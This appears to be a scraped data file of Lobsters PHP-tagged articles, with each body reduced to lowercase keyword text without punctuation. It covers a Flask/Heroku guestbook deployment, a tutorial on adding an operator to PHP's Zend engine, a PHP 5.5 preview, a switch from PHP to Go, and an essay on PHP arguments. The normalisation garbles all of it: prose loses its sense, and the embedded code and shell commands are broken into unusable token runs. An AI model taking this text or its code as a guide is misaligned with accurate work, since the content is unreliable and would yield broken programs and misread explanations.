helpfully pointed finally useful unless someone write surprise infrastructure need make use hr form action urlfor signme method post p name input type text name name p p message textarea name message row col textarea p p button sign button p form flask import flask redirect rendertemplate request urlfor approute sign method post def signme newentry dbguestbookentry namerequestformget name dummy forgot leave name messagerequestformget message wow best website ever dbsessionadd newentry dbsessioncommit return redirect urlfor root refresh try done arrgh thing hard option classic approach dumping server leaving running tmux let ever already python stuff deployed using gunicorn reverse proxying upstart script like setup except upstart blow could easily copy helpful context fast post though note debianbased distribution packaged gunicorn daemon create file couple line get going awesome probably braindead thing use apache modwsgi worry running app even flask first choice deployment take line boilerplate apache configuration php devs surely familiar apache installed gotten along fine without far goddammit dreamhost unsupported instruction using apache modpassenger python app basically idea else plenty really fastcgi regular cgi yeargh various option running standalone thing totally blog someday swear want something dropdead simple want interbutts try something never tried dear reader watch fumble try heroku hold sign thing wait confirmation email okay linked quickstart guide let remind far moreso flask idea first install ruby thing naturally let u pause twenty minute reflection documentation compiled perushian devblog heroku login enter heroku credential email eeveeheroku veekuncom password typing hidden found following ssh public key would like use heroku account uploading ssh public key done authentication successful eevee perushian devblog cd guestbookdemo eevee perushian devguestbookdemo heroku create creating done stack cedar http git herokucom git remote heroku added seem need pipstyle requirementstxt list python distribution one per line procfile tell heroku launch thing instruction flask already made app beating submission minimal change trial error flask sqlalchemy web python guestbookdemo change remove debugtrue course heroku want app run port specified environment use apprun portosenviron port change host tell nicely thing use heroku log went couple cycle git push heroku master heroku log admit surprisingly painless kinda sorta almost like running locally bit runaround anytime change anything add web process anything run think eevee perushian devguestbookdemo heroku p scale scaling web process done running eevee perushian devguestbookdemo heroku p web python guestbookdemo need reserve database make sqlalchemy connect create table eevee perushian devguestbookdemo heroku addons add herokupostgresql dev adding herokupostgresql dev done free attached herokupostgresqljade database created available warning dev beta increased risk data loss downtime send feedback dodfeedback herokucom use heroku addons doc herokupostgresql dev view documentation engine createengine osenvironget herokupostgresqljadeurl postgresql guestbookdemo eevee perushian devguestbookdemo heroku run python running python attached terminal guespython default oct gcc type help copyright credit license information guestbookdemo import db dbbasemetadatacreateall binddbengine oh done http actually way way le painful expected would hecka pay money thing dumb little app connects database add thing show thing running live free web host know use half thing started took couple hour minus writing post trying figure change take effect typed blog post actual code playing cat eating muffin whatever fucking around retrospect probably best person demonstrate speed anything consider routed url url generator inside app never time wrote web server configuration whatsoever even web server installed machine full orm disposal work half dozen different database sql injection vulnerability orm take care x vulnerability template language take care good see second entry already attempt script injection http header splitting vulnerability even write header manually even touch half flask also omnipresent session flash message lightweight plugins test amenity logging god know else quick believe dirty certainly namespace app separate db configuration separate template inheritance inclined could using flask configuration stuff get hardcoded value well plus half setup stuff application thinking db schema creating git repository finding hosting stuff ready go rest breeze know anything flask heroku morning getting thing done mutually exclusive nicely none hard different come dip toe might like find threw thing complete embarrassing heroku fumbling github choice techcrunch quote yet php allegedly used threequarters web site alleged indeed link seems indicate us url http header detect language site written popular language plugin apache report server header whether used current page modphp everything else addendum told even le reliable appears first glance omit nearly site guess php misfit pragmatic one would pick anything even doubleclawed hammer build future often ridiculed belittled hip guy class write cool code ruby python always one get shit done yeah well fuck write python cool rapidly tiring invented motivation used reason disregard say use python balance getting stuff done stuff fall soon turn back programming world tradeoff php trade immediacy slightest hint reliability geek writing site haskell always meet academic learning become bad standard purity powerful typing often solves real problem software engineering tradeoff powerful typing also make common task particularly difficult implement people find tradeoff acceptable many know thing passing familiarity one language passing familiarity one methodology know favorite tool tradeoff good bad merely used love god please expand context bubble passing rest u squabbling elitist philosopher let pretend post nothing php sick death typing
290,Lobsters,php,PHP programming,How to add new (syntactic) features to PHP,http://nikic.github.com/2012/07/27/How-to-add-new-syntactic-features-to-PHP.html,add new syntactic feature php,prerequisite life php script tokenization tokenizer extension parsing compilation execution finishing thought crossreference tool internals mailing list,several people recently asked start want add new syntactic feature php aware existing tutorial matter try illustrate whole process following time general introduction working zend engine upfront apologize overly long post post assumes already basic knowledge c also know fundamental concept php implementation like zvals read beforehand example use addition operator might already know language like python work follows word hello world foo bar vardump hello word true vardump foo word true vardump blub word false string php fun vardump php string true vardump python string false basically array operator inarray function without needlehaystack problem string like false strpos prerequisite get going first check compile php need tool probably already installed system may need install bison using package manager choice ubuntu sudo aptget install sudo aptget install bison next clone phpsrc git compile get source code git clone http gitphpnetrepositoryphpsrcgit cd phpsrc create new branch operator git checkout b addinoperator build configure script buildconf configure php debug mode thread safety configure disableall enabledebug enablemaintainerzts compile number core make php binary available sapicliphp try thing sapicliphp v sapicliphp r echo hallo world hopefully working php compile take look php actually run script life php script run script php go three main phase tokenization parsing compilation execution following explain exactly done phase implemented need change order get operator working tokenization first phase php read source code break smaller unit called token example php code php echo hello world would broken following token topentag php techo echo twhitespace tconstantencapsedstring hello world see raw source code broken semantically meaningful token process referred tokenization lexing scanning implemented zendlanguagescannerl file zend directory open file scroll bit somewhere around line find large number token definition look like stinscripting exit return texit meaning rather obvious exit encountered source code lexer tag texit content state text matched stinscripting normal state php code example state stdoublequote double quoted string stheredoc heredoc string etc another thing done scanning routine specifying semantic value also called lower value lval short example stinscripting stvaroffset label zendcopyvalue zendlval yytext yyleng zendlval type isstring return tstring label match php identifier defined code return token tstring additionally copy text token zendlval lexer encounter identifier like foobarclass set foobarclass lval also done string number variable name etc luckily operator require indepth knowledge lexer add code snippet somewhere file analogous exit token stinscripting return tin furthermore let engine know added new token open zendlanguageparsery insert following line somewhere among peer compile php using make run top level phpsrc folder zend generate new lexer using compile test worked try running something like give nice parse error parse error syntax error unexpected tin command line code line last thing regenerate data used tokenizer extension expose internal lexer userland php code cd exttokenizer folder execute tokenizerdatagensh run git diff stat see something like zendzendlanguageparsery zendzendlanguagescannerc zendzendlanguagescannerl zendzendlanguagescannerdefsh exttokenizertokenizerdatac file changed insertion deletion zendlanguagescannerc file actual lexer generated using contains line number information every change lexer cause huge diff worry parsing compilation source code broken meaningful token php recognize larger structure like block defining function process called parsing defined zendlanguageparsery file definition file actual parser generated using bison understand parser definition work let look example classstatement variablemodifiers cg accesstype zlval classvariabledeclaration classconstantdeclaration traitusestatement methodmodifiers function isreference tstring zenddobeginfunctiondeclaration tsrmlscc parameterlist methodbody zenddoabstractmethod tsrmlscc zenddoendfunctiondeclaration tsrmlscc let leave part curly brace left following classstatement variablemodifiers classvariabledeclaration classconstantdeclaration traitusestatement methodmodifiers function isreference tstring parameterlist methodbody read class statement variable declaration access modifier class constant declaration trait use statement method method modifier optional returnbyref method name parameter list method body find exactly method modifier go methodmodifier definition etc fairly straightforward order add support parser add new expr tin expr rule exprwithoutvariable exprwithoutvariable expr tin expr run make bison attempt rebuild parser fail following rather obscure error message conflict shiftreduce somepathphpsrczendzendlanguageparsery expected shiftreduce conflict make somepathphpsrczendzendlanguageparserc error shiftreduce conflict basically mean parser know situation php grammar three shiftreduce conflict expected due stuff like dangling elseifelse ambiguity remaining conflict caused new rule reason specify behave around operator example write foo bar someothercond php interpret foo bar someothercond foo bar someothercond called operator precedence related concept operator associativity determines happens write foo bar baz order fix shiftreduce conflict find following line start parser add tin end nonassoc tissmallerorequal tisgreaterorequal mean operator precedence style comparison operator operator nonassociative example foo bar someothercond interpreted foo bar someothercond lower precedence foo abc def ghi jkl interpreted foo abc def ghi jkl higher precedence foo bar baz throw parse error nonassociative rerun make everything work fine try running something like sapicliphp r foo bar nothing apart printing memory leak info thu jul script zendzendlanguagescannerl freeing byte script total memory leak detected expected told parser yet match operator curly brace come replace existing expr tin expr rule following expr tin expr zenddobinaryop zendin tsrmlscc part curly brace called semantic action run whenever parser match certain rule part strange looking variable node example refers first expr refers second expr third element rule result node zenddobinaryop compiler instruction tell compiler emit zendin opcode take operand put result compiler instruction defined zendcompilec header entry zendcompileh zenddobinaryop example look like void zenddobinaryop zenduchar op znode result const znode const znode tsrmlsdc zendop opline getnextop cg activeoparray tsrmlscc opline opcode op opline resulttype istmpvar opline resultvar gettemporaryvariable cg activeoparray setnode opline setnode opline getnode result opline result code easy grasp next section help putting context one last thing mention case add zenddo function adding new syntax adding new binary operator one case add new zenddo function look existing one quite simple execution previous section already mentioned compiler emitting opcodes let look closer opcodes look like see zendcompileh struct zendop opcodehandlert handler znodeop znodeop znodeop result ulong extendedvalue uint lineno zenduchar opcode zenduchar zenduchar zenduchar resulttype short description individual component mean opcode actual operation executed could example zendadd zendsub result every operation maximum two operand obviously also use one even none result node type node given resulttype cover node look like type minute extendedvalue extended value used store flag integer value eg variable fetching instruction us store variable kind like zendfetchlocal zendfetchglobal handler optimize opcode execution store handler function associated opcode operand type determined automatically set compilation code lineno know five basic type go type property istmpvar temporary variable usually result expression like foo bar temporary variable shared implement refcounting usually short lived one instruction creates next one already free temporary variable usually written n would first temporary variable second etc iscv compiled variable save hash table lookup php cache location simple variable like foo array c array furthermore compiled variable allow php optimize hash table away altogether cv denoted using n n offset compiledvariable array isvar simple variable turned cv kind variable access like foo bar foo bar return isvar variable basically normal zval refcounting everything var written n isconst constant literal code example write foo code type isconst constant allow optimization like reusing zvals value precalculating hash isunused operand used related znodeop look like typedef union znodeop zenduint constant zenduint var zenduint num zendulong hash zenduint oplinenum zendop jmpaddr zval zv zendliteral literal void ptr znodeop see node union ie contain one element one depending context example zv used store isconst zvals var used store variable number iscv isvar istmpvar variable rest used various special circumstance eg jmpaddr used jmp instruction required condition loop others used compilation execution like constant know individual ops look like remaining question stored every function file php creates zendoparray store opcodes well lot information want go detail individual component know structure exists let get back implementation operator already instructed compiler emit zendin opcode define opcode done zendvmdefh file look find full definition like zendvmhandler zendadd consttmpvarcv consttmpvarcv useopline zendfreeop saveopline fastaddfunction ext opline resultvar tmpvar bpvarr bpvarr tsrmlscc checkexception zendvmnextopcode zendin opcode look similar worth understanding going go line line header defines four thing opcode id opcode called zendadd opcode accepts const tmp var cv first operand opcode accepts const tmp var cv second operand zendvmhandler zendadd consttmpvarcv consttmpvarcv useopline mean want access zendop opline required opcodes accessing operand setting return value useopline every operand accessed freeop variable defined used figure whether operand need freeing zendfreeop saveopline actually load zendop opline useopline declaration saveopline call fast add function fastaddfunction tell put result temporary result variable ext access temporary variable id opline resultvar ext opline resultvar tmpvar fetch first operand reading r bpvarr bpvarr fetch second operand reading bpvarr tsrmlscc free operand necessary check exception exception occur virtually everywhere one check nearly opcodes doubt add check checkexception go next opcode zendvmnextopcode probably noticed lot uppercasestuff reason zendvmdefh definition file actual zend vm generated stored zendvmexecuteh biiig file php three different virtual machine kind namely call default goto switch different implementation detail definition file us lot pseudomacros like useopline later replaced concrete implementation furthermore generated vm creates specialized implementation possible operandtype permutation end single zendadd function rather different function zendaddconstconst zendaddconsttmp order implement zendin opcode add new opcode definition skeleton end zendvmdefh file number next free opcode may need choose larger number zendvmhandler zendin consttmpvarcv consttmpvarcv useopline zendfreeop zval saveopline bpvarr bpvarr todo checkexception zendvmnextopcode nothing fetching operand discarding right away order generate new vm run php zendvmgenphp within zend directory give lot warning e modifier deprecated ignore go top level directory run make recompile everything worked fine run sapicliphp r foo bar without getting error still anything finally implement actual logic let start string case ztypep isstring zval int usecopy convert needle string zendmakeprintablezval usecopy usecopy zstrlenp empty needle return true zvaltrue ext opline resultvar tmpvar else char found zendmemnstr zstrvalp haystack zstrvalp needle zstrlenp needle length zstrvalp zstrlenp haystack end ptr zvalbool ext opline resultvar tmpvar found null free copy usecopy zvaldtor hardest part actually casting needle string done using zendmakeprintablezval function may either create new zval pas usecopy function copied value put variable deal two different variable everywhere furthermore copy freed end last three line everything simple find whether haystack contains needle using zendmemnstr needle empty string return true directly empty string part every string added code place todo reran zendvmgenphp recompiled using make already halfworking operator sapicliphp r vardump foo bar bool false sapicliphp r vardump foo foobar bool true sapicliphp r vardump foo hallo foo world bool true sapicliphp r vardump bool true sapicliphp r vardump bool false sapicliphp r vardump test bool true next implement array behavior else ztypep isarray hashposition po zval value start assumption value nt contained zvalfalse ext opline resultvar tmpvar iterate array zendhashinternalpointerresetex zarrvalp po zendhashgetcurrentdataex zarrvalp void value po success zval result compare value using isequalfunction result value tsrmlscc success zlval result zvaltrue ext opline resultvar tmpvar break zendhashmoveforwardex zarrvalp po haystack simply traversed every value checked needle compare using compare using one would replace isequalfunction isidenticalfunction rerunning zendvmgenphp make operator fully operational sapicliphp r vardump test bool false sapicliphp r vardump test foo bar bool false sapicliphp r vardump test foo test bar bool true sapicliphp r vardump foo bool true comparing using one last thing consider happen second operator neither array string take easy way throw warning return false else zenderror ewarning right operand either string array zvalfalse ext opline resultvar tmpvar rebuilding recompiling vm sapicliphp r vardump foo new stdclass warning right operand either string array command line code line bool false might best behavior eg one could allow thing like lazy right finishing thought hope helped understand add new feature php zend engine run php script even though article quite long covered small part whole system want modification ze largest part job reading existing code crossreference tool help lot browsing php source code apart always ask question phppecl room efnet created implementation whatever feature want next step bringing internals mailing list people look feature decide whether go oh one last thing operator example plan proposing inclusion always comment question please leave
291,Lobsters,php,PHP programming,What PHP 5.5 might look like,http://nikic.github.com/2012/07/10/What-PHP-5-5-might-look-like.html,php might look like,internals mailing list backwards compatibility break window xp support dropped e modifier deprecated corresponding rfc function class addition boolval rfc intl addition intl extension calendar breakiterator arraycolumn proposal simple api password hashing rfc language change constant dereferencing rfc empty work function call expression rfc getting fully qualified class name rfc parameter skipping rfc scalar typehinting scalar typehints harder think proposal scalar typehints casting getters setter rfc generator rfc list comprehension generator expression mailing list announcement wrapping subscribe internals mailing list,php released four month ago probably bit early look next php version still like give people following internals mailing list small sneak peek php might look like sure understand php early development stage nobody know end result look like talking proposal pretty sure thing listed go php least current form get excited list new feature proposal rather large sorted significance want read four feature personally excited without ado list stuff worked php backwards compatibility break start two change already landed master represent bc break degree least window xp support dropped status landed responsible pierre joye php longer support window xp system around decade old php pulling plug e modifier deprecated status landed responsible e modifier instructs pregreplace function evaluate replacement string php code instead simple string replacement unsurprisingly behavior constant source problem security issue use modifier throw deprecation warning php replacement use pregreplacecallback function find information change corresponding rfc function class addition next look planned function class addition boolval status landed responsible jille timmermans php already implement strval intval floatval function consistent boolval function added exactly thing bool cast used callback function status landed responsible anthony ferrara stand passwordbased key derivation function name already say algorithm deriving cryptographic key password required encryption algorithm also used password hashing extensive description usage example see rfc intl addition status landed responsible gustavo andré do santos lope many improvement intl extension eg new intlcalendar intlgregoriancalendar intltimezone intlbreakiterator intlrulebasedbreakiterator intlcodepointbreakiterator class sadly know much intl extension direct mailing list announcement calendar breakiterator want know arraycolumn status proposed responsible ben ramsey proposal pending new arraycolumn arraypluck function would behave follows usernames arraycolumn user name usernames foreach user user usernames user name would like fetching column database array simple api password hashing status proposed responsible anthony ferrara recent password leak linkedin etc shown even large website get properly hash password people advocating use bcrypt year still people seem using completely unsafe hash figured reason might really hard use api crypt function thus would like introduce new simple api secure password hashing password foo creating hash hash passwordhash password passwordbcrypt verifying password passwordverify password hash password correct else password wrong new hashing api come feature outlined rfc language change come really interesting stuff new language feature enhancement constant dereferencing status landed responsible xinchen hui constant dereferencing mean array operation directly applied string array literal two example function randomhexstring length str length str mtrand direct dereference string function randombool return false true mtrand direct dereference array think feature much use practice make language bit consistent see also rfc empty work function call expression status landed responsible currently empty language construct used variable expression particular code like empty getfriends would throw error php becomes valid code info see rfc getting fully qualified class name status proposed responsible ralph schindler php introduced namespaces ability alias class namespaces shorter version apply string class name though use somedeeplynestednamespacefoobar work try use global foobar class reflection new reflectionclass foobar solve new foobar class syntax proposed return fully qualified name class use somedeeplynestednamespacefoobar work foobar class resolved somedeeplynestednamespacefoobar reflection new reflectionclass foobar class example see rfc parameter skipping status proposed responsible stas malyshev function accepting multiple optional parameter currently way change last one leaving others default taking example rfc function like following function createquery orderby jointype execute false reporterrors true way set reporterrors false without replicating two default value solve way skipping parameter proposed createquery name default default false personally particular fond proposal eye code need feature badly designed function optional parameter scalar typehinting status proposed responsible anthony ferrara scalar typehinting originally planned go never made due lack consensus info scalar typehints made php yet see scalar typehints harder think php discussion come think fairly decent proposal scalar typehints casting would work casting input value specified type cast occur without data loss eg would valid input int parameter hallo world would match behavior internal function function foo int foo foo foo foo yet clear maybe notice foo yet clear maybe notice foo error foo abc error getters setter status proposed responsible clint priest never fan writing getxyz setxyz value method welcome change proposal add new syntax defining happen property set read class timeperiod public second public hour get return second set second value timeperiod new timeperiod timeperiod hour vardump timeperiod second int vardump timeperiod hour int also feature like readonly property want know look rfc generator status proposed responsible currently custom iterators used rarely implementation requires lot boilerplate code generator solve issue providing easy boilerplatefree way create iterators example could define range function iterator function xrange start end step start end step yield foreach xrange xrange function behavior builtin range function one difference instead returning array value return iterator generates value onthefly indepth introduction topic see rfc list comprehension generator expression status proposed responsible list comprehension provide simple way small operation array firstnames foreach user user yield user firstname list comprehension equivalent following code firstnames foreach user user firstnames user firstname also possible filter array way underageusers foreach user user user age yield user generator expression similar return iterator generates value onthefly instead array example see mailing list announcement wrapping see lot awesome stuff worked php already said php still young know sure get want stay updated new feature want help discussion andor development sure subscribe internals mailing list comment welcome
292,Lobsters,php,PHP programming,Dumping PHP For Go,http://mikebeale.blogspot.com/2012/07/dumping-php-for-go.html,dumping php go,php laravel effective go heroku openshift http,background long time coming switch php main programming language working php year grown tired limitationsissues hard convert always job php programmer got ta eat aggravation coming working php forced switch hate php nt hate php language many advantage like great community numerous library although many different mvc framework great documentation ease entry library connect php virtually every database rest api third party software reason began using language first place php supported virtually every web hosting company planet making php useful skill great open source framework apps like wordpress zend joomla many others list php first probably clarify continue use php many project working still use php however many quirk php bothering wo nt go detail saying anything new subject want read epic rant php issue see post php code especially large code repository become difficult enjoy maintaining sometimes app stop working typo code spaghetti code becomes unreadable php nt seem exciting anymore nt seem anything exciting happening yes php recently released new trait feature much happening language nothing interesting far apps framework object piqued interest laravel pythonrubyjavaany language like consider open trying new programming language even nt wind using language long term sometimes programming skill still benefit solving solution different point view quick overview dealing language brief enough nt taken seriously python problem python completed couple project python find joy work ruby experience ruby rail around version time framework made coding easier expense performance scaling terrible time node seems rage everybody like use term nonblocking make seem cool draw able code language client side server side even share code nt write validation two place node still young provides ample library large developer community already java bloated use possibility oracle might sue c mostly used school nt need use since c language seemed well thought using net product mono nt viable solution language would like still try various different reason like clojure scala dart smalltalk erlang haskell get go shiznit go make better coder enjoy coding go productive quickly documentation complete organized support forum great frequented core contributor language effective go great way get started go like multiple return value instead exception force deal error right away people nt like static typing strict compiler save lot debugging time prevents program crashing rare use case compiler tell declared variable nt use tried use undeclared variable sign probably made typo somewhere compiler fast large apps still compile half second since sysadmin prefer pay extra code managed someone besides google app engine people implemented go heroku openshift although nt used go concurrency model seems straightforward easy use interface reflection awesome take little getting used interface click head hooked blog post sum interfacesreflection better http conclusion go help write cleaner maintainable code go released code base really stabilized allowing feel confident using go production environment maintainer go say people write go program confident program continue compile run without change many environment time scale year since million php user six people read blog hi mom doubt cause shift php user use go maybe next time project fit go give try create google app engine project free help get started
293,Lobsters,php,PHP programming,"PHP, Python and Persuasion","http://lukeplant.me.uk/blog/posts/php,-python-and-persuasion/",php python persuasion,jeff attwood confirmation bias parse unable tool result best web indepth large underestimate size package main repository author python perl haskell conclusion individual phpsh inability get basic arithmetic question correct python decimal module,always find fascinating observe conversation people argument fail convince day ago witnessed php debate kicked jeff attwood one reason rule simple irrationality u vulnerable confirmation bias people often go great length convince right thing need change view practice see time two group people share experience made different decision spend leisure time group often desperate believe missed seek persuade reality persuade group fun however assuming person irrational really help fact hinder communication attempt constructive looking way fail convince people try turn rebuttal post expert understanding eevee writes empty var extremely notafunction anything variable eg empty var parse error earth parser need know empty experienced programmer empty rather surprising know least idea implement programming language understand terminology like lexer parser interpreter etc try empty var return parse error even though look like function think programming language must designed complete amateur want anything edit changed paragraph previously getting mixed isset empty le experienced able programmer however none problem programming language entirely magic one type magic surprising another talking parser completely incomprehensible developer communicate reaction feel requires deeper level understanding thing supposed work le able experienced developer simply unable ass quality tool work craftsmanship many coder thing matter whether php allows get something done quality tool material used matter many coder unable ass quality tool using care even could programming simply getting something done thought taking pride work absent person never convinced argument talk quality tool amateur v professional eevee accused php world created filled amateur suspect many php developer effect java people saying pythonistas python many python developer care first place word may even negative connotation association massively overengineered poorly written bloatware written java c could replaced python project time smaller many php user simply aspire professional happy called amateur amateur stuff fun pure hobbyist making money relying php behave sane manner important data php brought joy life matter php live standard need many developer simply care much data go website php decent way handling decimal value close enough people quality tool unimportant quality result little consequence noone die sue even major bug also professional often feel obligation support code write whereas amateur therefore amateur always trade longterm maintainability initial deployment speed defending day job previous argument cover lot user however many using php even customer may demand work done php perhaps essential problem php language designed simple template language nonprogrammers turned workhorse web network effect caused adoption amongst amateur made language professional people want feel good work people position much influence whether use php tell someone tool using bad get defensive even would rather using something else extremely fortunate work get choose project carefully charge high rate work take real pride actually fairly unkind berate people using language really choose even think choosing defend death alternative say suck yes world disservice continuing promote pay occasionally similar situation past know demoralising depressing comforting rationalise current situation fact last situation like come whole bunch rationalisation still think valid degree engineer must pragmatist level paid achieve thing internal beauty code take pride customer satisfaction matter language factor also must consider development tool availability quality library documentation support library availability people maintain software future thing depend human factor network effect used justify choice basis people choosing reading apologise patronising post meant insult aimed others experience vast majority php developer come across used serious web framework say thing like best web make statement need indepth knowledge large number alternative web platform web platform existence however author demonstrate knowledge alternative never going persuade anyone way rather lead people simply dismiss opinion entirely ready make pronouncement subject clearly fraction required knowledge sign nothing say trustworthy however problem go way eevee rant jeff contain statement degree date appear date someone side know standard solution problem highlighted reason obvious feel passionately bad something stop using level knowledge technology go lead bit problem unwilling work technology x bad always dismissed ignorant facet problem extremely easy underestimate something knowledge instance simply underestimate size competing community admit surprised learn php package manager package main repository however author pointed might surprised know following figure python pypi package django related plone related related related turbogears related perl cpan perl module author let add haskell example minority language ever one first language think building web site hackage package web category one web framework sure language boast similar much better figure even know look java quite possibly large idea central repository even make sense php despite huge number developer look rather small comparison statistic flawed variety way php included bigger community flawed example pypi download stats often way people using mirror etc affect point making point community large figure tip iceberg term much going every community within community see big figure think doubt anyone could seriously competing true matter community belong make difficult communicate meaningful way honestly say evaluated alternative fair way alternative huge conclusion sure conclusion actually pitfall face communicating across different technology community often forget thing especially communicating internet post mainly help remember broad spectrum php user think argument php going individual effective example suppose customer want php website deal money way eg shop might attempt shock using phpsh demonstrate php inability get basic arithmetic question correct would explain language problem floating point arithmetic language good solution problem eg python decimal module make easy get thing right php nothing approaching yes know bcmath gnu multiple precision binding rather php fundamental attitude silently ignore error attempt paper error silently convert data even mean losing information language want handle data different situation think need completely different argument many situation even try think word going come insulting since counterproductive often applies internet need remember
